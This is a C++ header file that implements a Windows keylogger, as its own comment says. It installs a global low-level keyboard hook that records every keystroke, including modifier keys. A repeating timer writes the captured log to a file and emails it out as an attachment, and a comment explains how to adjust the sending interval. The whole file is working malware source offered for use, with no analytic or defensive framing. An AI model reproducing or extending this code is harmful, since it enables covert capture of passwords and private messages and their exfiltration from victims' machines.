//Initialies KeyHooks for windows environment (this keylogger only works on windows OS
//Change the 2000*60 with something else for changing timer on line Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <Windows.h>
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"
std::string keyLog = "";


void TimerSendMail()
{
	if (keyLog.empty())
		return;
	std::string  last_file = IO::writeLog(keyLog);

	if (last_file.empty())
	{
		Helper::WriteLogsOfApp("File Creation was not successfull.Keylog '" + keyLog + "'");
		return;
	}
	int x = Mail::SendMail("Log[" + last_file + "]",
		"The File has been attached to the mail :\n"+keyLog,IO::GetOurPath(true)+last_file);
	if (x != 7)
		Helper::WriteLogsOfApp("mail was not send ! Error Code: " + Helper::ToString(x));
	else
		keyLog = "";
}
Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
HHOOK eHook = NULL;

LRESULT OurKeyBoardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);
	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		keyLog += AllKeys::KEYSCons[kbs->vkCode].Name;
		if (kbs->vkCode == VK_RETURN)
			keyLog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL
			|| key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT
			|| key == VK_MENU || key == VK_LMENU || key == VK_RMENU
			|| key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN
			|| key == VK_RWIN)
		{
			std::string KeyName = AllKeys::KEYSCons[kbs->vkCode].Name;
			KeyName.insert(1, "/");
			keyLog += KeyName;
		}

	}
	return CallNextHookEx(eHook, nCode, wparam, lparam);
}
bool InstallHook()
{
	Helper::WriteLogsOfApp("Hook Started....Timer Started");
	MailTimer.Start(true);
	
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyBoardProc, GetModuleHandle(NULL), 0);
	return eHook == NULL;

}
bool UnInstallHook()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return (bool)b;
}
bool Ishooked()
{
	return (bool)(eHook == NULL);
}
#endif

